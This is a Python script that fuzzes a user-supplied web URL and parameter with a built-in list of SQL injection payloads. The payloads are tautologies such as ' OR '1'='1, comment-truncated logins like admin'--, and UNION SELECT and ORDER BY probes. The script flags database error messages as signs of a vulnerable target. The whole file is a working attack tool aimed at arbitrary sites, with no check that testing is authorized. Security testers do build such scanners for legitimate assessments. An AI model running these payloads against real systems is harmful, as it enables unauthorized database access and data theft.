sql_injector.py
"""
SQL Injection Fuzzer
Automatically checks a target URL and parameter for common SQL injection payloads.
Identifies boolean-based or error-based differences.
"""
import requests
from urllib.parse import urljoin, urlencode

def check_sqli(url, param, payloads=None):
    if payloads is None:
        # Classic SQLi payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' AND 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--"
        ]

    target_url = url
    separator = '&' if '?' in url else '?'

    print(f"[*] Target: {target_url}")
    print(f"[*] Parameter: {param}")
    print("-" * 40)

    for payload in payloads:
        test_url = f"{target_url}{separator}{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            content = response.text.lower()
            
            # Heuristic checks for SQLi evidence
            if "syntax error" in content or "unclosed quotation mark" in content:
                print(f"[!] Error found: {test_url}")
                print(f"    Response snippet: {content[:100]}...")
                return True
            elif "warning" in content or "mysql_fetch" in content:
                print(f"[!] Warning found: {test_url}")
                print(f"    Response snippet: {content[:100]}...")
                return True
            else:
                print(f"[*] Checked: {payload} (No obvious error)")
        except requests.RequestException as e:
            print(f"[!] Connection failed for {payload}: {e}")

    print("[-] No obvious SQL injection found with basic payloads.")
    return False

if __name__ == "__main__":
    # Usage: python sql_injector.py "http://target.com/page?id=" "id"
    target = input("Enter target URL (include query string): ")
    parameter = input("Enter parameter name: ")
    check_sqli(target, parameter)